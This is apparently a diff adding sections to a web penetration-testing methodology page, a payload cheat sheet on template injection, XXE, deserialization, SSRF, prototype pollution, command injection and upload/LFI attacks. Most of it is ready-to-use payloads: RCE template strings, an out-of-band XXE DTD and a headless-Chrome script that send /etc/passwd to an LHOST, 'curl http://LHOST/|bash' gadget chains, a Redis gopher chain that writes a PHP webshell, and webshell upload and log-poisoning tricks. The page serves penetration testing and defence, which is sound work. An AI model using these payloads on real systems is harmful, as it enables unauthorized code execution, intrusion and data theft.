+    </li>
+  </ul>
+
+<h3 id="methodology-ssti-jinja2">1.5.2 Jinja2 / Flask Exploitation</h3>
+  <ul>
+    <li>MRO class traversal for subprocess access:
+      <ul>
+        <li><code>{{{{''.__class__.__mro__[1].__subclasses__()[N](['id'], stdout=-1).communicate()[0]}}}}</code></li>
+        <li>Find the index of <code>subprocess.Popen</code> in the subclass list</li>
+        <li>Enumerate: <code>{{{{''.__class__.__mro__[1].__subclasses__()}}}}</code></li>
+      </ul>
+    </li>
+    <li>Flask config globals shortcut:
+      <ul>
+        <li><code>{{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}</code></li>
+        <li>Also: <code>{{{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}}}</code></li>
+      </ul>
+    </li>
+    <li>Filter bypass techniques:
+      <ul>
+        <li>Dot filter: use <code>|attr('__class__')</code> instead of <code>.__class__</code></li>
+        <li>Underscore filter: hex encoding <code>request|attr('\\x5f\\x5fglobals\\x5f\\x5f')</code></li>
+        <li>String concatenation: <code>'\\x5f\\x5f'+'class'+'\\x5f\\x5f'</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-ssti-other-engines">1.5.3 Other Template Engines</h3>
+  <ul>
+    <li>Freemarker (Java):
+      <ul>
+        <li><code>&lt;#assign ex = "freemarker.template.utility.Execute"?new()&gt;${{ex("id")}}</code></li>
+        <li>Also: <code>ObjectConstructor</code> for arbitrary Java class instantiation</li>
+      </ul>
+    </li>
+    <li>Twig (PHP):
+      <ul>
+        <li>Twig 1.x: <code>{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("id")}}}}</code></li>
+        <li>Twig 2.x/3.x: <code>{{{{["id"]|map("system")|join}}}}</code></li>
+      </ul>
+    </li>
+    <li>ERB (Ruby):
+      <ul>
+        <li><code>&lt;%= `id` %&gt;</code> or <code>&lt;%= system("id") %&gt;</code></li>
+      </ul>
+    </li>
+    <li>EJS (Node.js):
+      <ul>
+        <li><code>&lt;%= process.mainModule.require("child_process").execSync("id") %&gt;</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-python"># Jinja2 — MRO class traversal RCE
+{{''.__class__.__mro__[1].__subclasses__()[N](['id'], stdout=-1).communicate()[0]}}
+
+# Jinja2 — Flask config globals shortcut
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# Jinja2 — filter bypass (dot and underscore filters)
+{{request|attr('\x5f\x5fglobals\x5f\x5f')}}
+
+# Freemarker (Java)
+&lt;#assign ex = "freemarker.template.utility.Execute"?new()&gt;${ex("id")}
+
+# Twig 2.x/3.x (PHP)
+{{["id"]|map("system")|join}}
+
+# ERB (Ruby)
+&lt;%= `id` %&gt;</code></pre>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener noreferrer">PortSwigger SSTI</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings SSTI</a></p>
+
+<h3 id="methodology-xxe">1.6 XML External Entity Injection</h3>
+<ul><li>Any endpoint that parses XML (file uploads, SOAP, SVG, DOCX) is a candidate. Test for file read first, then escalate.</li></ul>
+<h3 id="methodology-xxe-basic-xxe">1.6.1 Basic XXE</h3>
+  <ul>
+    <li>Test for classic file read:
+      <ul>
+        <li><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></li>
+        <li>Inject the entity reference where output is reflected in the response</li>
+      </ul>
+    </li>
+    <li>Read source code with PHP wrappers:
+      <ul>
+        <li><code>&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php"&gt;</code></li>
+        <li>Decode the base64 to read the full source including <code>&lt;?php</code> tags</li>
+      </ul>
+    </li>
+    <li>Test for SSRF via XXE:
+      <ul>
+        <li><code>&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</code></li>
+        <li><code>&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:6379/"&gt;</code> (internal Redis)</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Basic XXE — file read
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+
+# PHP base64 wrapper — read source code including &lt;?php tags
+&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php"&gt;
+
+# SSRF via XXE — AWS metadata
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;</code></pre>
+
+<h3 id="methodology-xxe-blind-xxe">1.6.2 Blind / OOB XXE</h3>
+  <ul>
+    <li>When output is not reflected, use OOB exfiltration:
+      <ul>
+        <li>External DTD: <code>&lt;!DOCTYPE foo [&lt;!ENTITY % ext SYSTEM "http://LHOST/evil.dtd"&gt;%ext;]&gt;</code></li>
+      </ul>
+    </li>
+    <li>Craft the exfiltration DTD on your server:
+      <ul>
+        <li>evil.dtd: <code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</code></li>
+        <li>Then: <code>&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://LHOST/?d=%file;'&gt;"&gt;%eval;%exfil;</code></li>
+        <li>Host at <code>python3 -m http.server 80</code> and watch the incoming request</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Blind/OOB XXE — inject in the target XML
+&lt;!DOCTYPE foo [&lt;!ENTITY % ext SYSTEM "http://LHOST/evil.dtd"&gt;%ext;]&gt;
+
+# evil.dtd — host on your server (python3 -m http.server 80)
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://LHOST/?d=%file;'&gt;"&gt;
+%eval;
+%exfil;</code></pre>
+  <ul>
+    <li>CDATA trick for files containing XML metacharacters:
+      <ul>
+        <li>Wrap the file content in CDATA sections via parameter entity chaining</li>
+        <li>Required when the target file contains <code>&lt;</code>, <code>&gt;</code>, or <code>&amp;</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-xxe-xxe-rce">1.6.3 XXE to RCE</h3>
+  <ul>
+    <li>PHP expect wrapper (if enabled):
+      <ul>
+        <li><code>&lt;!ENTITY xxe SYSTEM "expect://id"&gt;</code> &mdash; direct command execution</li>
+        <li>Rare in modern installs but check <code>phpinfo()</code> for <code>expect</code> extension</li>
+      </ul>
+    </li>
+    <li>Chain XXE &rarr; SSRF &rarr; internal service exploitation:
+      <ul>
+        <li>Read cloud metadata IAM credentials via XXE SSRF</li>
+        <li>Hit internal admin panels or APIs that trust localhost</li>
+        <li>Exploit internal services with known vulnerabilities (Redis, Consul)</li>
+      </ul>
+    </li>
+    <li>File write via XXE (rare):
+      <ul>
+        <li>Some parsers allow <code>SYSTEM</code> entity with <code>file://</code> write semantics</li>
+        <li>More common: use the file-read to find credentials, then use those for RCE</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener noreferrer">PortSwigger XXE</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings XXE</a></p>
+
+<h3 id="methodology-deserialization">1.7 Insecure Deserialization</h3>
+<ul><li>Identify the serialisation format, find a viable gadget chain, deliver the payload through the right channel.</li></ul>
+<h3>Deserialization Format Quick-Reference</h3>
+<table class="custom-table">
+  <thead>
+    <tr><th>Format</th><th>Magic Bytes</th><th>Tool</th><th>Example Command</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Java Serialized</td><td><code>rO0AB</code> (b64) / <code>0xACED0005</code></td><td>ysoserial</td><td><code>java -jar ysoserial.jar CommonsCollections6 "id"</code></td></tr>
+    <tr><td>PHP Serialized</td><td><code>O:</code> / <code>a:</code> / <code>s:</code></td><td>PHPGGC</td><td><code>phpggc Laravel/RCE1 system id</code></td></tr>
+    <tr><td>.NET BinaryFormatter</td><td><code>AAEAAAD/////</code> (b64)</td><td>ysoserial.net</td><td><code>ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc"</code></td></tr>
+    <tr><td>Node.js node-serialize</td><td><code>_$$ND_FUNC$$_</code></td><td>Manual IIFE</td><td><code>{"rce":"_$$ND_FUNC$$_function(){...}()"}</code></td></tr>
+    <tr><td>.NET ViewState</td><td><code>/wEP...</code> (b64)</td><td>ysoserial.net</td><td><code>ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd"</code></td></tr>
+  </tbody>
+</table>
+<h3 id="methodology-deserialization-java-deser">1.7.1 Java Deserialization</h3>
+  <ul>
+    <li>Identify serialized Java objects:
+      <ul>
+        <li>Base64 magic: <code>rO0AB</code> (base64 of <code>0xACED0005</code>)</li>
+        <li>Raw hex magic: <code>0xACED0005</code> at start of binary data</li>
+        <li>Check cookies, POST parameters, WebSocket messages</li>
+      </ul>
+    </li>
+    <li>Use URLDNS gadget for blind detection:
+      <ul>
+        <li><code>java -jar ysoserial.jar URLDNS "http://LHOST/detect" > payload.ser</code></li>
+        <li>URLDNS triggers a DNS lookup with no dependencies &mdash; works on any JVM</li>
+      </ul>
+    </li>
+    <li>Generate RCE payloads with ysoserial:
+      <ul>
+        <li><code>java -jar ysoserial.jar CommonsCollections6 "curl http://LHOST/x" > payload.ser</code></li>
+        <li>Try multiple gadgets: CommonsCollections1/3/5/6/7, Spring1/2, Groovy1, Jdk7u21</li>
+        <li>Base64-encode if the transport is text-based</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Java — blind detection with URLDNS (no dependencies, works on any JVM)
+java -jar ysoserial.jar URLDNS "http://LHOST/detect" &gt; payload.ser
+
+# Java — RCE with CommonsCollections6
+java -jar ysoserial.jar CommonsCollections6 "curl http://LHOST/x" &gt; payload.ser
+
+# Base64-encode for text-based transports
+base64 -w0 payload.ser</code></pre>
+  <ul>
+    <li>Check classpath for vulnerable libraries:
+      <ul>
+        <li>commons-collections 3.x/4.x, commons-beanutils, Spring, Groovy</li>
+        <li>Enumerate via error messages or <code>/WEB-INF/lib/</code> directory listing</li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-deserialization-php-deser">1.7.2 PHP Deserialization</h3>
+  <ul>
+    <li>Find unserialize calls in source:
+      <ul>
+        <li><code>grep -rn "unserialize\\s*(" src/</code></li>
+        <li>Check for <code>__wakeup()</code>, <code>__destruct()</code>, <code>__toString()</code> magic methods in classes</li>
+      </ul>
+    </li>
+    <li>Craft a POP chain manually or use PHPGGC:
+      <ul>
+        <li><code>phpggc Laravel/RCE1 system id</code></li>
+        <li><code>phpggc Symfony/RCE4 exec "curl http://LHOST/|bash"</code></li>
+        <li><code>phpggc --list</code> to see all available chains</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># PHP — generate POP chain payloads with PHPGGC
+phpggc Laravel/RCE1 system id
+phpggc Symfony/RCE4 exec "curl http://LHOST/|bash"
+phpggc Monolog/RCE1 system "id"
+phpggc --list                                    # show all available chains</code></pre>
+  <ul>
+    <li>Deliver the payload:
+      <ul>
+        <li>URL-encode if sent via GET/POST parameter</li>
+        <li>Base64-encode if the app decodes before unserializing</li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-deserialization-dotnet-deser">1.7.3 .NET Deserialization</h3>
+  <ul>
+    <li>Generate payloads with ysoserial.net:
+      <ul>
+        <li><code>ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64</code></li>
+        <li>ViewState: <code>ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --path=/app --decryptionalg=AES --validationalg=SHA1 --decryptionkey=... --validationkey=...</code></li>
+      </ul>
+    </li>
+    <li>XmlSerializer with ObjectDataProvider:
+      <ul>
+        <li>Craft an XML payload using ExpandedWrapper + ObjectDataProvider</li>
+        <li>Target the <code>MethodName</code> and <code>MethodParameters</code> properties</li>
+      </ul>
+    </li>
+    <li>Check for unsafe deserialization in source:
+      <ul>
+        <li><code>grep -rn "BinaryFormatter\\|NetDataContract\\|SoapFormatter\\|LosFormatter\\|ObjectStateFormatter" src/</code></li>
+        <li>Also check for custom <code>ISerializable</code> implementations</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># .NET — generate payloads with ysoserial.net
+ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64
+
+# ViewState exploitation (need keys from web.config or machine.config)
+ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" \
+  --path=/app --decryptionalg=AES --validationalg=SHA1 \
+  --decryptionkey=... --validationkey=...</code></pre>
+
+<h3 id="methodology-deserialization-nodejs-deser">1.7.4 Node.js Deserialization</h3>
+  <ul>
+    <li>Identify node-serialize usage:
+      <ul>
+        <li><code>grep -rn "node-serialize\\|serialize\\|unserialize" src/</code></li>
+      </ul>
+    </li>
+    <li>Exploit with IIFE pattern:
+      <ul>
+        <li><code>{{"rce":"_$$ND_FUNC$$_function(){{require('child_process').exec('id', function(e,o){{/* */}})}}()"}}</code></li>
+        <li>The IIFE executes immediately upon deserialization</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-javascript">// Node.js — node-serialize IIFE payload (executes on deserialization)
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){/* */})}()"}</code></pre>
+  <ul>
+    <li>Other Node.js deserialization vectors:
+      <ul>
+        <li><code>js-yaml.load()</code> with <code>!!js/function</code> tag (pre-4.0)</li>
+        <li>Prototype pollution through <code>JSON.parse()</code> with merge operations</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings Insecure Deserialization</a> &middot; <a href="https://book.hacktricks.xyz/pentesting-web" target="_blank" rel="noopener noreferrer">HackTricks Web</a></p>
+
+<h3 id="methodology-ssrf">1.8 Server-Side Request Forgery</h3>
+<ul><li>Any feature that fetches a URL (webhooks, PDF generators, image importers, URL previews) is an SSRF candidate.</li></ul>
+<h3 id="methodology-ssrf-target-discovery">1.8.1 Target Discovery</h3>
+  <ul>
+    <li>Probe cloud metadata endpoints:
+      <ul>
+        <li>AWS: <code>url=http://169.254.169.254/latest/meta-data/</code></li>
+        <li>GCP: <code>url=http://metadata.google.internal/computeMetadata/v1/</code> with header <code>Metadata-Flavor: Google</code></li>
+        <li>Azure: <code>url=http://169.254.169.254/metadata/instance?api-version=2021-02-01</code> with header <code>Metadata: true</code></li>
+      </ul>
+    </li>
+    <li>Scan internal services via SSRF:
+      <ul>
+        <li>Common targets: Redis (<code>6379</code>), Consul (<code>8500</code>), Docker API (<code>2375</code>), Elasticsearch (<code>9200</code>)</li>
+        <li>Internal admin panels: <code>http://127.0.0.1:8080/admin</code></li>
+        <li>Other hosts on the same subnet</li>
+      </ul>
+    </li>
+    <li>Blind SSRF detection via timing:
+      <ul>
+        <li>Compare response times: accessible port vs closed port vs filtered port</li>
+        <li>Python script to iterate ports and measure response delays</li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-ssrf-filter-bypass">1.8.2 Filter Bypass</h3>
+  <ul>
+    <li>IP address obfuscation:
+      <ul>
+        <li>Octal: <code>0177.0.0.1</code> = 127.0.0.1</li>
+        <li>Decimal: <code>2130706433</code> = 127.0.0.1</li>
+        <li>Hex: <code>0x7f000001</code> = 127.0.0.1</li>
+        <li>IPv6: <code>[::1]</code> or <code>[0:0:0:0:0:ffff:127.0.0.1]</code></li>
+      </ul>
+    </li>
+    <li>DNS rebinding:
+      <ul>
+        <li><code>127.0.0.1.nip.io</code> resolves to 127.0.0.1</li>
+        <li><code>127-0-0-1.sslip.io</code> resolves to 127.0.0.1</li>
+        <li>Custom DNS server that alternates between public and internal IPs</li>
+      </ul>
+    </li>
+    <li>URL parsing tricks:
+      <ul>
+        <li>Credential section: <code>http://evil.com@127.0.0.1/</code></li>
+        <li>Fragment: <code>http://127.0.0.1#@evil.com</code></li>
+        <li>Backslash: <code>http://evil.com\\@127.0.0.1</code></li>
+        <li>Double encoding: <code>http://127.0.0.1%252f..%252f</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-ssrf-protocol-smuggling">1.8.3 Protocol Smuggling</h3>
+  <ul>
+    <li>Gopher protocol for arbitrary TCP:
+      <ul>
+        <li><code>gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20x%20"payload"%0d%0a...</code></li>
+        <li>Use Gopher to send raw Redis, SMTP, or MySQL commands</li>
+        <li>URL-encode each line with <code>%0d%0a</code> for CRLF</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Gopher — write a webshell via Redis through SSRF
+gopher://127.0.0.1:6379/_FLUSHALL%0d%0a
+SET%20x%20"%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E"%0d%0a
+CONFIG%20SET%20dir%20/var/www/html/%0d%0a
+CONFIG%20SET%20dbfilename%20shell.php%0d%0a
+SAVE%0d%0a
+
+# Headless Chrome SSRF — inject into HTML rendered to PDF
+&lt;script&gt;fetch("file:///etc/passwd").then(r=&gt;r.text()).then(t=&gt;fetch("http://LHOST/?"+btoa(t)))&lt;/script&gt;</code></pre>
+  <ul>
+    <li>Headless Chrome / wkhtmltopdf SSRF:
+      <ul>
+        <li>Inject HTML: <code>&lt;script&gt;fetch("file:///etc/passwd").then(r=>r.text()).then(t=>fetch("http://LHOST/?"+btoa(t)))&lt;/script&gt;</code></li>
+        <li>PDF generators that render user-controlled HTML are prime targets</li>
+        <li>Also try: <code>&lt;iframe src="file:///etc/passwd"&gt;</code></li>
+      </ul>
+    </li>
+    <li>HTTP verb tampering for bypasses:
+      <ul>
+        <li><code>for V in GET POST PUT DELETE PATCH OPTIONS HEAD; do curl -X $V ...; done</code></li>
+        <li>Some SSRF filters only check GET requests</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener noreferrer">PortSwigger SSRF</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings SSRF</a></p>
+
+<h3 id="methodology-proto-pollution">1.9 Prototype Pollution (Node.js)</h3>
+<ul><li>Unsafe recursive merge or deep-copy functions allow attackers to inject properties into <code>Object.prototype</code>, affecting all objects in the application.</li></ul>
+<h3 id="methodology-proto-pollution-discovery">1.9.1 Discovery</h3>
+  <ul>
+    <li>Find unsafe merge/extend functions in source:
+      <ul>
+        <li><code>grep -rn "merge\|assign\|extend\|clone\|deepCopy" src/</code></li>
+        <li>Check for custom recursive merge implementations</li>
+        <li>Known vulnerable libraries: lodash <code>&lt;4.17.12</code>, jQuery <code>&lt;3.4.0</code></li>
+      </ul>
+    </li>
+    <li>Black-box detection:
+      <ul>
+        <li>POST JSON: <code>{{"__proto__": {{"polluted": true}}}}</code></li>
+        <li>Check if the property appears on unrelated objects in subsequent responses</li>
+        <li>Also try: <code>{{"constructor": {{"prototype": {{"polluted": true}}}}}}</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-proto-pollution-exploitation">1.9.2 Exploitation</h3>
+  <ul>
+    <li>EJS template engine gadget:
+      <ul>
+        <li><code>{{"__proto__": {{"outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').execSync('id');//"}}}}</code></li>
+        <li>Pollutes the EJS <code>outputFunctionName</code> option, injecting code into the compiled template</li>
+      </ul>
+    </li>
+    <li>Pug template engine gadget:
+      <ul>
+        <li><code>{{"__proto__": {{"block": {{"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}}}}</code></li>
+      </ul>
+    </li>
+    <li>Handlebars template engine gadget:
+      <ul>
+        <li><code>{{"__proto__": {{"pendingContent": "&lt;script&gt;...&lt;/script&gt;"}}}}</code></li>
+        <li>Injects content into Handlebars template compilation</li>
+      </ul>
+    </li>
+    <li>child_process.spawn shell gadget:
+      <ul>
+        <li><code>{{"__proto__": {{"shell": true}}}}</code></li>
+        <li>Makes all subsequent <code>child_process.spawn</code> calls use a shell, enabling command injection in arguments</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-javascript">// EJS gadget — pollute outputFunctionName to inject code into compiled template
+{"__proto__": {"outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').execSync('id');//"}}
+
+// Pug gadget — inject into template block compilation
+{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}
+
+// child_process.spawn shell gadget — makes all spawn calls use a shell
+{"__proto__": {"shell": true}}</code></pre>
+
+<p><strong>General references:</strong> <a href="https://portswigger.net/web-security/prototype-pollution" target="_blank" rel="noopener noreferrer">PortSwigger Prototype Pollution</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings Prototype Pollution</a></p>
+
+<h3 id="methodology-cmdinj">1.10 Command Injection &amp; Code Execution</h3>
+<ul><li>Test every user input that reaches an OS command or code evaluation function.</li></ul>
+<h3 id="methodology-cmdinj-sink-id">1.10.1 Sink Identification</h3>
+  <ul>
+    <li>PHP command execution sinks:
+      <ul>
+        <li><code>system()</code>, <code>exec()</code>, <code>passthru()</code>, <code>shell_exec()</code>, <code>popen()</code>, <code>proc_open()</code></li>
+        <li>Backtick operator: <code>`command`</code></li>
+        <li>Code evaluation: <code>eval()</code>, <code>assert()</code>, <code>preg_replace()</code> with <code>/e</code> modifier</li>
+      </ul>
+    </li>
+    <li>Python command execution sinks:
+      <ul>
+        <li><code>os.system()</code>, <code>subprocess.call()</code>, <code>subprocess.Popen()</code></li>
+        <li>Code evaluation: <code>eval()</code>, <code>exec()</code>, <code>compile()</code></li>
+      </ul>
+    </li>
+    <li>Node.js command execution sinks:
+      <ul>
+        <li><code>child_process.exec()</code>, <code>child_process.execSync()</code>, <code>child_process.spawn()</code></li>
+        <li>Code evaluation: <code>eval()</code>, <code>Function()</code>, <code>vm.runInNewContext()</code></li>
+      </ul>
+    </li>
+    <li>Test basic injection operators:
+      <ul>
+        <li>Separator: <code>; id</code>, <code>| id</code>, <code>|| id</code>, <code>& id</code>, <code>&& id</code></li>
+        <li>Newline: <code>%0a id</code>, <code>%0d%0a id</code></li>
+        <li>Backtick: <code>`id`</code>, <code>$(id)</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-cmdinj-filter-bypass">1.10.2 Filter Bypass Techniques</h3>
+  <ul>
+    <li>PHP-specific evasion:
+      <ul>
+        <li>String concatenation: <code>"sys"."tem"</code> passes to <code>call_user_func()</code></li>
+        <li>Reverse: <code>strrev("metsys")</code> &rarr; <code>system</code></li>
+        <li>Base64: <code>base64_decode("c3lzdGVt")</code> &rarr; <code>system</code></li>
+        <li>Variable variables: <code>$a="sys"; $b="tem"; $c=$a.$b; $c("id")</code></li>
+      </ul>
+    </li>
+    <li>Whitespace bypass:
+      <ul>
+        <li><code>$IFS</code> as space substitute in bash: <code>cat$IFS/etc/passwd</code></li>
+        <li>Tab: <code>%09</code></li>
+        <li>Brace expansion: <code>{{cat,/etc/passwd}}</code></li>
+      </ul>
+    </li>
+    <li>Character blacklist bypass:
+      <ul>
+        <li>Wildcard: <code>/???/??t /???/p??s?d</code> = <code>cat /etc/passwd</code></li>
+        <li>Hex in bash: <code>$'\\x63\\x61\\x74'</code> = <code>cat</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># PHP filter bypass techniques
+"sys"."tem"                # string concatenation → call_user_func("system","id")
+strrev("metsys")           # reverse → system
+base64_decode("c3lzdGVt")  # base64 decode → system
+$a="sys"; $b="tem"; $c=$a.$b; $c("id")   # variable variables
+
+# Whitespace bypass
+cat$IFS/etc/passwd         # $IFS as space
+{cat,/etc/passwd}          # brace expansion
+
+# Character blacklist bypass
+/???/??t /???/p??s?d       # wildcards → cat /etc/passwd
+$'\x63\x61\x74'            # hex in bash → cat</code></pre>
+
+<h3 id="methodology-cmdinj-php-bypasses">1.10.3 PHP-Specific Bypasses</h3>
+  <ul>
+    <li>Bypass disable_functions via mail():
+      <ul>
+        <li><code>mail("", "", "", "", "-X/var/www/html/shell.php")</code></li>
+        <li>The <code>-X</code> flag writes the mail log to the specified file &mdash; inject PHP code in the body</li>
+      </ul>
+    </li>
+    <li>.htaccess injection for execution:
+      <ul>
+        <li><code>AddType application/x-httpd-php .jpg</code> &mdash; makes .jpg files execute as PHP</li>
+        <li>Upload the .htaccess via file upload or other write primitive</li>
+      </ul>
+    </li>
+    <li>PHP eval filter bypass (Dolibarr-style):
+      <ul>
+        <li>When <code>eval()</code> filters function names but allows expressions</li>
+        <li>Use variable functions: <code>$f="system"; $f("id")</code></li>
+        <li>Use <code>call_user_func()</code>: <code>call_user_func("system", "id")</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings Command Injection</a> &middot; <a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener noreferrer">OWASP Top 10</a></p>
+
+<h3 id="methodology-upload-lfi">1.11 File Upload &amp; LFI to RCE</h3>
+<ul><li>Upload a webshell or chain a local file inclusion to achieve code execution.</li></ul>
+<h3 id="methodology-upload-lfi-upload-bypass">1.11.1 Upload Bypass</h3>
+  <ul>
+    <li>Extension bypass techniques:
+      <ul>
+        <li>Alternative extensions: <code>.php5</code>, <code>.phtml</code>, <code>.pht</code>, <code>.phps</code>, <code>.phar</code></li>
+        <li>Null byte (legacy): <code>shell.php%00.jpg</code></li>
+        <li>Double extension: <code>shell.php.jpg</code>, <code>shell.jpg.php</code></li>
+        <li>Case variation: <code>.pHp</code>, <code>.PhP</code></li>
+      </ul>
+    </li>
+    <li>MIME type bypass:
+      <ul>
+        <li>Change <code>Content-Type</code> to <code>image/jpeg</code> or <code>image/png</code></li>
+        <li>Intercept with Burp and modify after the browser sets it</li>
+      </ul>
+    </li>
+    <li>Magic bytes injection:
+      <ul>
+        <li><code>GIF89a;&lt;?php system($_GET['c']);?&gt;</code> &mdash; passes magic-byte and file-type checks</li>
+        <li>Prepend PNG/JPEG header bytes for binary checks</li>
+      </ul>
+    </li>
+    <li>.htaccess injection:
+      <ul>
+        <li>Upload <code>.htaccess</code> containing <code>AddType application/x-httpd-php .xxx</code></li>
+        <li>Then upload <code>shell.xxx</code> &mdash; Apache executes it as PHP</li>
+      </ul>
+    </li>
+  </ul>
+
+<h3 id="methodology-upload-lfi-lfi-rce">1.11.2 LFI Exploitation</h3>
+  <ul>
+    <li>Basic path traversal:
+      <ul>
+        <li><code>../../../../etc/passwd</code></li>
+        <li>Stripping bypass: <code>....//....//etc/passwd</code></li>
+        <li>URL-encoded: <code>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></li>
+        <li>Double-encoded: <code>%252e%252e%252f</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Magic bytes webshell — passes GIF89a magic byte check
+GIF89a;&lt;?php system($_GET['c']);?&gt;
+
+# .htaccess injection — make arbitrary extensions execute as PHP
+AddType application/x-httpd-php .xxx
+
+# Log poisoning — inject PHP via User-Agent, then include the log
+curl -A "&lt;?php system(\$_GET['c']);?&gt;" http://target/
+# Then LFI: ../../../../var/log/apache2/access.log&amp;c=id</code></pre>
+  <ul>
+    <li>PHP wrappers for code execution:
+      <ul>
+        <li>Source read: <code>php://filter/read=convert.base64-encode/resource=config.php</code></li>
+        <li>Input stream: <code>php://input</code> with PHP code in POST body</li>
+        <li>Data wrapper: <code>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+</code></li>
+        <li>Expect (if enabled): <code>expect://id</code></li>
+      </ul>
+    </li>
+    <li>Log poisoning:
+      <ul>
+        <li>Inject PHP via User-Agent: <code>curl -A "&lt;?php system(\$_GET['c']);?&gt;" http://target/</code></li>
+        <li>Include the access log: <code>../../../../var/log/apache2/access.log</code></li>
+        <li>Also check: <code>/var/log/nginx/access.log</code>, <code>/var/log/mail.log</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># PHP wrappers for LFI → RCE
+php://filter/read=convert.base64-encode/resource=config.php   # source read
+php://input                          # POST body as PHP (send &lt;?php system('id');?&gt;)
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   # inline PHP
+expect://id                          # direct RCE (if expect ext loaded)</code></pre>
+  <ul>
+    <li>Session file poisoning:
+      <ul>
+        <li>Write PHP code into session data via a controllable session variable</li>
+        <li>Include session file: <code>../../../../tmp/sess_PHPSESSID</code></li>
+        <li>Or: <code>/var/lib/php/sessions/sess_PHPSESSID</code></li>
+      </ul>
+    </li>
+  </ul>
+
